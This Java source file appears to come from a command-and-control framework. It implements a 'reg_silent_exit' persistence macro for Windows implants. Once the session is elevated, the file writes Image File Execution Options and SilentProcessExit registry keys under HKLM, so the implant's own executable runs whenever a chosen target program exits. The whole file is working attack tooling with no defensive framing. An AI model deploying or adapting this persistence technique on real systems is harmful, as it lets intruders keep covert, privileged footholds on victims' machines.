package c2.session.macro.persistence;

import c2.Commands;
import c2.WindowsConstants;
import c2.session.macro.AbstractCommandMacro;
import c2.session.macro.MacroOutcome;
import c2.win.WindowsCmdLineHelper;

public class RegistrySilentExit extends AbstractCommandMacro {

	public static String COMMAND = "reg_silent_exit";

	public static String HELP = COMMAND + " <name of EXE to attach>";

	private static String REG_COMMAND1 = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$TARGET_EXE$\" /v GlobalFlag /t REG_DWORD /d 512";
	private static String REG_COMMAND2 = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\$TARGET_EXE$\" /v ReportingMode /t REG_DWORD /d 1";
	private static String REG_COMMAND3 = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\$TARGET_EXE$\" /v MonitorProcess /d \"$PAYLOAD_EXE$\"";

	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.startsWith(COMMAND + " ");
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		String elements[] = cmd.split(" ");
		if (elements.length != 2) {
			outcome.addError(HELP);
		} else {
			if (WindowsCmdLineHelper.isClientElevated(sessionId, io)) {
				String targetCmd = elements[1];
				String commands[] = { REG_COMMAND1, REG_COMMAND2, REG_COMMAND3 };
				sendCommand(Commands.CLIENT_GET_EXE_CMD, sessionId, outcome);
				String clientCmd = awaitResponse(sessionId, outcome);
				clientCmd = clientCmd.replace("\r", "");
				clientCmd = clientCmd.replace("\n", "");
				for (String command : commands) {
					String thisCommand = command.replace("$TARGET_EXE$", targetCmd);
					thisCommand = thisCommand.replace("$PAYLOAD_EXE$", clientCmd);
					sendCommand(thisCommand, sessionId, outcome);
					String response = awaitResponse(sessionId, outcome);
					if (!response.contains(WindowsConstants.WINDOWS_SYSTEM_OPERATION_COMPLETE_MSG)) {
						outcome.addError("Macro unsuccessful");
						return outcome;
					}
				}
				outcome.addMacroMessage("Success!");
			} else {
				outcome.addError("Failure: Must be running from an elevated session to write to HKLM");
			}
		}
		return outcome;
	}

}
